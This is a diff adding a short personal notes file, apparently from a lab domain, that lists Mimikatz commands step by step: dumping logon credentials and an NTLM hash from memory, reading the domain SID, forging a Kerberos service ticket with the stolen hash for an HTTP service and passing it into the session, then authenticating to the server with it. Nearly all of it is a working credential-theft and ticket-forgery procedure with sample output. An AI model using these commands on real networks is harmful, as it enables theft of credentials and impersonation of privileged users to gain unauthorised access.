@@ -1,0 +1,21 @@
+# On Win:
+.\mimi.exe
+privilege::debug
+
+1 step:
+sekurlsa::logonpasswords
+(* NTLM     : 4d28cf5252d399714xxxx0a51484ca09)
+
+2 step:
+cmd> whoami /user
+S-1-5-21-1987370270-65xxx5905-17818xxx69-1105
+>>> S-1-5-21-1987370270-65xxx5905-17818xxx69 <<-1105
+
+3 step:
+kerberos::golden /sid:S-1-5-21-1987370270-65xxx5905-17818xxx69 /domain:superalex.sec /ptt /target:server01.superalex.sec /service:http /rc4:4d28cf5252d399714xxxx0a51484ca09 /user:superadmin
+
+The we can use klist tool to check tickets:
+cmd> klist
+
+Then we can use to auth on servers:
+iwr -UseDefaultCredentials http://server01.superalex.sec
